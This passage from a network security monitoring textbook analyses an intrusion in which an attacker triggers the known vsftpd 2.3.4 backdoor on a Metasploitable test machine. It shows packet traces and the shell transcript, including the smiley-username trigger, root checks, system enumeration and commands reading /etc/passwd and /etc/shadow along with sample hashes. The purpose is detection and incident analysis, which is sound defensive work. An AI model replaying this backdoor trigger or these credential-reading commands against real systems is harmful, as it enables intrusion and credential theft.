<p class="calibre1">part of these details, section by section. (We begin by ignoring traffic asso-</p>
<p class="calibre1">ciated with reconnaissance.) </p>
<p class="calibre1">Listing 10-4 shows the first two packets of interest. </p>
<p class="calibre1">6589 2013-03-09 21:38:38.159255 203.0.113.10u -&gt; 192.168.3.5w </p>
<p class="calibre1">TCP 74 40206 &gt; 6200v [SYN] Seq=0 Win=14600 Len=0 MSS=1460</p>
<p class="calibre1">SACK_PERM=1 TSval=695390 TSecr=0 WS=16</p>
<p class="calibre1">6590 2013-03-09 21:38:38.159451  192.168.3.5 -&gt; 203.0.113.10</p>
<p class="calibre1">TCP 60 6200 &gt; 40206 [RST, ACK]x Seq=1 Ack=1 Win=0 Len=0</p>
<p class="calibre1"> <i class="calibre4">Listing 10-4: 203.0.113.10 tries to connect to port 6200 TCP on 192.168.3.5 but fails. </i></p>
<p class="calibre1">In Listing 10-4, 203.0.113.10 u is trying to connect to port 6200 TCP v </p>
<p class="calibre1">on 192.168.3.5 w, but the connection fails because port 6200 TCP is not lis-</p>
<p class="calibre1">tening. It replies with RST, ACK x. </p>
<p class="calibre1">Listing 10-5 shows what happens next. </p>
<p class="calibre1">6591 2013-03-09 21:38:38.160692 203.0.113.10u -&gt; 192.168.3.5w  </p>
<p class="calibre1">TCP 74 50376 &gt; 21v [SYN] Seq=0 Win=14600 Len=0 MSS=1460 </p>
<p class="calibre1">SACK_PERM=1 TSval=695390 TSecr=0 WS=16</p>
<p class="calibre1">6592 2013-03-09 21:38:38.160702  192.168.3.5 -&gt; 203.0.113.10 </p>
<p class="calibre1">TCP 74 21 &gt; 50376 [SYN, ACK] Seq=0 Ack=1 Win=5792 Len=0 MSS=1460 </p>
<p class="calibre1">SACK_PERM=1 TSval=276175 TSecr=695390 WS=32</p>
<p class="calibre1">6593 2013-03-09 21:38:38.161131 203.0.113.10 -&gt; 192.168.3.5  </p>
<p class="calibre1">TCP 66 50376 &gt; 21 [ACK] Seq=1 Ack=1 Win=14608 Len=0 TSval=695390 TSecr=276175</p>
<p class="calibre1">6594 2013-03-09 21:38:38.162679  192.168.3.5 -&gt; 203.0.113.10 </p>
<p class="calibre1">FTP 86 Response: 220 (vsFTPd 2.3.4)</p>
<p class="calibre1">6595 2013-03-09 21:38:38.163164 203.0.113.10 -&gt; 192.168.3.5  </p>
<p class="calibre1">TCP 66 50376 &gt; 21 [ACK] Seq=1 Ack=21 Win=14608 Len=0 TSval=695391 TSecr=276175</p>
<p class="calibre1">6596 2013-03-09 21:38:38.164876 203.0.113.10 -&gt; 192.168.3.5  </p>
<p class="calibre1">FTP 77 Request: USER 0M:)x</p>
<p class="calibre1">6597 2013-03-09 21:38:38.164886  192.168.3.5 -&gt; 203.0.113.10 </p>
<p class="calibre1">TCP 66 21 &gt; 50376 [ACK] Seq=21 Ack=12 Win=5792 Len=0 TSval=276175 TSecr=695391</p>
<p class="calibre1">6598 2013-03-09 21:38:38.164888  192.168.3.5 -&gt; 203.0.113.10 </p>
<p class="calibre1">FTP 100 Response: 331 Please specify the password. </p>
<p class="calibre1">6599 2013-03-09 21:38:38.166318 203.0.113.10 -&gt; 192.168.3.5  </p>
<p class="calibre1">FTP 76 Request: PASS azzy</p>
<p class="calibre1"> <i class="calibre4">Listing 10-5: 203.0.113.10 logs in to the FTP server at 192.168.3.5. </i></p>
<p class="calibre1">Server-side Compromise   <b class="calibre3">217</b></p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p252"/>In Listing 10-5, we see that 203.0.113.10 u connects to the FTP service on port 21 TCP v on 192.168.3.5 w. We also see user 0M:) x log in and </p>
<p class="calibre1">provide the password azz y. Listing 10-6 shows the consequence of the suc-</p>
<p class="calibre1">cessful login. </p>
<p class="calibre1">6600 2013-03-09 21:38:38.166971 203.0.113.10u -&gt; 192.168.3.5w</p>
<p class="calibre1">TCP 74 60155 &gt; 6200v [SYN] Seq=0 Win=14600 Len=0 MSS=1460 </p>
<p class="calibre1">SACK_PERM=1 TSval=695392 TSecr=0 WS=16</p>
<p class="calibre1">6601 2013-03-09 21:38:38.166978  192.168.3.5 -&gt; 203.0.113.10</p>
<p class="calibre1">TCP 74 6200 &gt; 60155 [SYN, ACK]x Seq=0 Ack=1 Win=5792 Len=0 MSS=1460 </p>
<p class="calibre1">SACK_PERM=1 TSval=276175 TSecr=695392 WS=32</p>
<p class="calibre1">6602 2013-03-09 21:38:38.168296 203.0.113.10 -&gt; 192.168.3.5</p>
<p class="calibre1">TCP 66 60155 &gt; 6200 [ACK] Seq=1 Ack=1 Win=14608 Len=0 TSval=695392 TSecr=276175</p>
<p class="calibre1">6603 2013-03-09 21:38:38.168738 203.0.113.10 -&gt; 192.168.3.5</p>
<p class="calibre1">TCP 69 60155 &gt; 6200 [PSH, ACK] Seq=1 Ack=1 Win=14608 Len=3 TSval=695392 TSecr=276175</p>
<p class="calibre1">6604 2013-03-09 21:38:38.168775  192.168.3.5 -&gt; 203.0.113.10</p>
<p class="calibre1">TCP 66 6200 &gt; 60155 [ACK] Seq=1 Ack=4 Win=5792 Len=0 TSval=276175 TSecr=695392</p>
<p class="calibre1"> <i class="calibre4">-- snip --</i></p>
<p class="calibre1"> <i class="calibre4">Listing 10-6: 203.0.113.10 connects to port 6200 TCP on 192.168.3.5. </i></p>
<p class="calibre1">Immediately, before tearing down the connection to the FTP server, </p>
<p class="calibre1">we see a new connection from 203.0.113.10 u to port 6200 TCP v on </p>
<p class="calibre1">192.168.3.5 w. This time, unlike in Listing 10-4, port 6200 TCP is listen-</p>
<p class="calibre1">ing, and it accepts the connection by replying with SYN, ACK x. </p>
<p class="calibre1">This sequence of events shows that port 6200 TCP was not actively accept-</p>
<p class="calibre1">ing connections until 203.0.113.10 logged in to the FTP server and provided </p>
<p class="calibre1">the proper username and password. </p>
<p class="calibre1"> <i class="calibre4"><b class="calibre3">Understanding the Backdoor</b></i></p>
<p class="calibre1">This pattern indicates that the FTP server at 192.168.3.5 was coded with a </p>
<p class="calibre1">backdoor watching for a certain username and password. In our case, we </p>
<p class="calibre1">saw user 0M:) and password azz. </p>
<p class="calibre1">It turns out that 192.168.3.5 was running a version of the vsftpd FTP </p>
<p class="calibre1">server that contained an unauthorized backdoor, as reported in July 2011 </p>
<p class="calibre1">by vsftpd developer Chris Evans ( <i class="calibre4">http://scarybeastsecurity.blogspot.com/2011/07/</i></p>
<p class="calibre1"> <i class="calibre4">alert-vsftpd-download-backdoored.html</i>). No details on how the code was </p>
<p class="calibre1">backdoored appear in the blog post, but the net effect was availability of </p>
<p class="calibre1">software that contained a serious security flaw. Users who enter a username </p>
<p class="calibre1">ending in a smiley face (like :)) will enjoy the ability to connect to a back-</p>
<p class="calibre1">door on the FTP server. Figure 10-10 summarizes the situation and adds </p>
<p class="calibre1">specific details for this case. </p>
<p class="calibre1">Why did the logs show records involving port 6200 TCP before the suc-</p>
<p class="calibre1">cessful exploitation of the FTP server? As we saw in the full content data </p>
<p class="calibre1">rendered by Tshark, the FTP connection happened before the backdoor </p>
<p class="calibre1">connection. Apparently, the tools used to log the alert and session data </p>
<p class="calibre1">couldn’t differentiate between the start times for these connections, and </p>
<p class="calibre1"><b class="calibre3">218</b>   Chapter 10</p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p253"/>they logged them out of order. This happens occasionally when performing NSM. This phenomenon helps support the idea of collecting multiple NSM </p>
<p class="calibre1">datatypes. When something doesn’t look quite right, you can compare dif-</p>
<p class="calibre1">ferent datatypes to better determine what really happened. </p>
<p class="calibre1">1. Intruder initiates attack against exposed, </p>
<p class="calibre1">vulnerable application on victim system. </p>
<p class="calibre1">NETWORK CONNECTION to port 21 TCP</p>
<p class="calibre1">Intruder</p>
<p class="calibre1">Victim</p>
<p class="calibre1">203.0.113.10</p>
<p class="calibre1">192.168.3.5</p>
<p class="calibre1">2. Attack method exploits vulnerable application </p>
<p class="calibre1">on victim system to execute code or commands. </p>
<p class="calibre1">vsftpd</p>
<p class="calibre1">Exploited</p>
<p class="calibre1">user 0M:)</p>
<p class="calibre1">pass azz</p>
<p class="calibre1">NETWORK CONNECTION to port 6200 TCP</p>
<p class="calibre1">Intruder</p>
<p class="calibre1">Victim</p>
<p class="calibre1">203.0.113.10</p>
<p class="calibre1">192.168.3.5</p>
<p class="calibre1">3. Malicious code interacts with intruder:</p>
<p class="calibre1">Intruder initiates new connection to </p>
<p class="calibre1">backdoor created by malicious code. </p>
<p class="calibre1"> <i class="calibre4">Figure 10-10: Server-side at ack involving exploitation of vulnerable vsftpd server</i></p>
<p class="calibre1"> <i class="calibre4"><b class="calibre3">What Did the Intruder Do? </b></i></p>
<p class="calibre1">Having confirmed that a malicious act took place, we need to understand </p>
<p class="calibre1">its impact. This scenario appears to be at least a Breach 3 incident, because </p>
<p class="calibre1">an intruder has established a C2 channel from his computer to the victim. </p>
<p class="calibre1">How can we find out how bad things are? </p>
<p class="calibre1">We’ve seen a GPL ATTACK_RESPONSE alert indicating id check returned root. </p>
<p class="calibre1">We also know that port 6200 TCP is the C2 channel. We might be able to </p>
<p class="calibre1">learn what the intruder is doing by generating a transcript for this connec-</p>
<p class="calibre1">tion, either through the GPL ATTACK_RESPONSE alert or by using the session </p>
<p class="calibre1">data from 203.0.113.10 to port 6200 TCP on 192.168.3.5. We can examine </p>
<p class="calibre1">the contents of that session in detail by generating a transcript, as you’ll see </p>
<p class="calibre1">in the following section. This examination should give us a better sense of </p>
<p class="calibre1">what the intruder is doing. </p>
<p class="calibre1"><b class="calibre3">Initial access</b></p>
<p class="calibre1">The transcript for activity from 203.0.113.10 to 192.168.3.5, shown in </p>
<p class="calibre1">Listing 10-7, shows a variety of events. We can’t be sure if an intruder is </p>
<p class="calibre1">interacting with the system in a live manner or if he is executing an auto-</p>
<p class="calibre1">mated attack. What matters, though, are the consequences of the activities. </p>
<p class="calibre1">Server-side Compromise   <b class="calibre3">219</b></p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p254"/>Sensor Name:    sovm-eth1-1</p>
<p class="calibre1">Timestamp:      2013-03-09 21:38:38</p>
<p class="calibre1">Connection ID:  .sovm-eth1-1_6012</p>
<p class="calibre1">Src IP:         203.0.113.10u    (Unknown)</p>
<p class="calibre1">Dst IP:         192.168.3.5v     (Unknown)</p>
<p class="calibre1">Src Port:               60155</p>
<p class="calibre1">Dst Port:               6200</p>
<p class="calibre1">OS Fingerprint: 203.0.113.10:60155 - UNKNOWN [S10:63:1:60:M1460,S,T,N,W4:.:?:?] (up: 1 hrs) OS Fingerprint:   -&gt; 192.168.3.5:6200 (link: ethernet/modem)</p>
<p class="calibre1">SRC: idw</p>
<p class="calibre1">DST: uid=0(root) gid=0(root) x</p>
<p class="calibre1">SRC: nohup  &gt;/dev/null 2&gt;&amp;1</p>
<p class="calibre1">SRC: echo T33KwxKuFgj4Uhy7</p>
<p class="calibre1">DST: T33KwxKuFgj4Uhy7</p>
<p class="calibre1">SRC: whoamiy</p>
<p class="calibre1">DST: rootz</p>
<p class="calibre1">SRC: echo 3816568630;echo hJZeerbzDFqlJEwWxlyePwOzBhEhQYbN</p>
<p class="calibre1">DST: 3816568630</p>
<p class="calibre1">DST: hJZeerbzDFqlJEwWxlyePwOzBhEhQYbN</p>
<p class="calibre1">SRC: id -u{ ;echo idGIIxVuiPbrznIwlhwdADqMpAAyLIlj}</p>
<p class="calibre1">DST: 0|</p>
<p class="calibre1">DST: idGIIxVuiPbrznIwlhwdADqMpAAyLIlj</p>
<p class="calibre1"> <i class="calibre4">Listing 10-7: The beginning of the transcript showing activity from 203.0.113.10 to 192.168.3.5</i></p>
<p class="calibre1">The first part of the transcript shows 203.0.113.10 u as the source (SRC) </p>
<p class="calibre1">IP address, and 192.168.3.5 v as the destination (DST) IP address. The </p>
<p class="calibre1">intruder, or code executed by the intruder, runs the Unix id command w </p>
<p class="calibre1">to determine the privileges that the channel currently provides. The result </p>
<p class="calibre1">indicates that this is a root-level account x. We see confirmation of the user </p>
<p class="calibre1">account with the whoami command y and its corresponding result: root z. </p>
<p class="calibre1">Now, using the id command with the -u switch {, the intruder sees the effec-</p>
<p class="calibre1">tive user ID of 0 |, which is again associated with root access. The intruder </p>
<p class="calibre1">or his script appears to be using echo statements with long strings } to mark </p>
<p class="calibre1">certain places in the flow of activity on the system. </p>
<p class="calibre1"><b class="calibre3">Enumerating the Victim</b></p>
<p class="calibre1">The transcript continues as shown in Listing 10-8. After running some basic </p>
<p class="calibre1">commands, the intruder spends more time learning about the victim. </p>
<p class="calibre1">SRC: /usr/sbin/dmidecodeu ;echo WqyRBNDvoqzwtPMOWXAZNDHVcqKrjVOA</p>
<p class="calibre1">DST: # dmidecode 2.9</p>
<p class="calibre1">DST: SMBIOS 2.4 present. </p>
<p class="calibre1">DST: 364 structures occupying 16040 bytes. </p>
<p class="calibre1">DST: Table at 0x000E0010. </p>
<p class="calibre1"> <i class="calibre4">-- snip --</i></p>
<p class="calibre1">DST: Handle 0x016B, DMI type 127, 4 bytes</p>
<p class="calibre1">DST: End Of Table</p>
<p class="calibre1">DST: WqyRBNDvoqzwtPMOWXAZNDHVcqKrjVOA</p>
<p class="calibre1"><b class="calibre3">220</b>   Chapter 10</p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p255"/>SRC: ls /etcv ;echo PZhfAinSgdJcyhYaCgAcFDjvciEFALXs</p>
<p class="calibre1">DST: X11</p>
<p class="calibre1">DST: adduser.conf</p>
<p class="calibre1">DST: adjtime</p>
<p class="calibre1">DST: aliases</p>
<p class="calibre1">DST: aliases.db</p>
<p class="calibre1"> <i class="calibre4">-- snip --</i></p>
<p class="calibre1">DST: wgetrc</p>
<p class="calibre1">DST: wpa_supplicant</p>
<p class="calibre1">DST: xinetd.conf</p>
<p class="calibre1">DST: xinetd.d</p>
<p class="calibre1">DST: zsh_command_not_found</p>
<p class="calibre1">DST: PZhfAinSgdJcyhYaCgAcFDjvciEFALXs</p>
<p class="calibre1">SRC: uname -aw ;echo gSQsJbnmNmNLEqElLTNRfxfLUQNndGaS</p>
<p class="calibre1">DST: Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 </p>
<p class="calibre1">i686 GNU/Linuxx</p>
<p class="calibre1">DST: gSQsJbnmNmNLEqElLTNRfxfLUQNndGaS</p>
<p class="calibre1">SRC: cat '/etc/issue'y;echo KoDdtYNGyWHGPIkHITZtMAYrhsyckIIC</p>
<p class="calibre1">DST:                 _                  _       _ _        _     _      ____  </p>
<p class="calibre1">DST:  _ __ ___   ___| |_ __ _ ___ _ __ | | ___ (_) |_ __ _| |__ | | ___|___ \ </p>
<p class="calibre1">DST: | '_ ` _ \ / _ \ __/ _` / __| '_ \| |/ _ \| | __/ _` | '_ \| |/ _ \ __) |</p>
<p class="calibre1">DST: | | | | | |  __/ || (_| \__ \ |_) | | (_) | | || (_| | |_) | |  __// __/ </p>
<p class="calibre1">DST: |_| |_| |_|\___|\__\__,_|___/ .__/|_|\___/|_|\__\__,_|_.__/|_|\___|_____|</p>
<p class="calibre1">DST:                             |_|                                          </p>
<p class="calibre1">DST: Warning: Never expose this VM to an untrusted network! </p>
<p class="calibre1">DST: Contact: msfdev[at]metasploit.com</p>
<p class="calibre1">DST: Login with msfadmin/msfadmin to get startedz</p>
<p class="calibre1">DST: KoDdtYNGyWHGPIkHITZtMAYrhsyckIIC</p>
<p class="calibre1">SRC: hostname{;echo SBRTSpmkeFZNpuHOMmcQUhMbnPnbNWPQ</p>
<p class="calibre1">DST: metasploitable</p>
<p class="calibre1">DST: SBRTSpmkeFZNpuHOMmcQUhMbnPnbNWPQ</p>
<p class="calibre1"> <i class="calibre4">Listing 10-8: Victim enumeration</i></p>
<p class="calibre1">The intruder, or his script, enumerates various aspects of the victim </p>
<p class="calibre1">system. He begins with the dmidecode command u to learn more about the </p>
<p class="calibre1">platform itself. Next, he retrieves a directory listing of  <i class="calibre4">/etc</i> v, where many key system configuration files reside. Using the uname command w, he discovers which kernel version x the system is running. Displaying the con-</p>
<p class="calibre1">tents of the  <i class="calibre4">issue</i> file shows text that appears after a user logs in z. Finally, the intruder reads the victim’s hostname {. The host system is running </p>
<p class="calibre1">a Linux distribution called Metasploitable, which is a tool used to learn </p>
<p class="calibre1">digital attack and defense, developed by the Metasploit team at Rapid7 </p>
<p class="calibre1">( <i class="calibre4">http://sourceforge.net/projects/metasploitable/files/Metasploitable2/</i>). Defenders use Metasploitable for training when performing security assessments </p>
<p class="calibre1">because Metasploitable has nothing but vulnerabilities—making it perfect </p>
<p class="calibre1">for anyone who wants to test the effectiveness of detection systems. </p>
<p class="calibre1">Apparently someone working at Vivian’s Pets downloaded Metasploitable, </p>
<p class="calibre1">installed it on the test network, and left it exposed to the Internet. An intruder </p>
<p class="calibre1">from IP address 203.0.113.10 found the computer, exploited the vulnerable </p>
<p class="calibre1">vsftpd server on it, and enumerated key aspects of the computer. </p>
<p class="calibre1">Server-side Compromise   <b class="calibre3">221</b></p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p256"/><b class="calibre3">accessing Credentials</b></p>
<p class="calibre1">In the last part of the transcript, the intruder turns to files where user cre-</p>
<p class="calibre1">dentials are stored, as shown in Listing 10-9. </p>
<p class="calibre1">SRC: cat '/etc/passwd'u;echo nRVObgMSefnPCAljIfCKrtCxyxAFwbXo</p>
<p class="calibre1">SRC:</p>
<p class="calibre1">DST: root:x:0:0:rootv:/root:/bin/bash</p>
<p class="calibre1">DST: daemon:x:1:1:daemon:/usr/sbin:/bin/sh</p>
<p class="calibre1">DST: bin:x:2:2:bin:/bin:/bin/sh</p>
<p class="calibre1">DST: sys:x:3:3:sys:/dev:/bin/sh</p>
<p class="calibre1">DST: sync:x:4:65534:sync:/bin:/bin/sync</p>
<p class="calibre1"> <i class="calibre4">-- snip --</i></p>
<p class="calibre1">DST:</p>
<p class="calibre1">DST: nRVObgMSefnPCAljIfCKrtCxyxAFwbXo</p>
<p class="calibre1">SRC: cat '/etc/shadoww';echo YMIULmTNrfStudFPMoeddbhSAwYHGUKY</p>
<p class="calibre1">DST: root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:14747:0:99999:7:::x</p>
<p class="calibre1">DST: daemon:*:14684:0:99999:7:::</p>
<p class="calibre1">DST: bin:*:14684:0:99999:7:::</p>
<p class="calibre1">DST: sys:$1$fUX6BPOt$Miyc3UpOzQJqz4s5wFD9l0:14742:0:99999:7:::</p>
<p class="calibre1">DST: sync:*:14684:0:99999:7:::</p>
<p class="calibre1"> <i class="calibre4">-- snip --</i></p>
<p class="calibre1">DST:</p>
<p class="calibre1">DST: CKNszVzdeRiiApmbrdHsuAolRXRtIFfF</p>
<p class="calibre1">SRC: ping -c 1 www.google.comy</p>
<p class="calibre1">SRC:</p>
<p class="calibre1">SRC: pwd</p>
<p class="calibre1">SRC:</p>
<p class="calibre1">DST: ping: unknown host www.google.comz</p>
<p class="calibre1">DST:</p>
<p class="calibre1"> <i class="calibre4">Listing 10-9: Viewing the </i>/etc passwd <i class="calibre4"> and </i>/etc/shadow <i class="calibre4"> files</i></p>
<p class="calibre1">In the final part of the transcript, the intruder displays the contents of </p>
<p class="calibre1">two key system files:  <i class="calibre4">/etc/passwd</i> u and  <i class="calibre4">/etc/shadow</i> w. The  <i class="calibre4">/etc/passwd</i> file contains information about users, such as root v, and the  <i class="calibre4">/etc/shadow</i> file stores hashes of the users’ passwords x. The transcript ends with the intruder or his </p>
<p class="calibre1">script trying to ping  <i class="calibre4">www.google.com</i> y, which fails z. </p>
<p class="calibre1">It is disturbing to see the intruder list the  <i class="calibre4">/etc/passwd</i> and  <i class="calibre4">/etc/shadow</i> files containing usernames and hashed passwords for the system. If he breaks </p>
</body></html>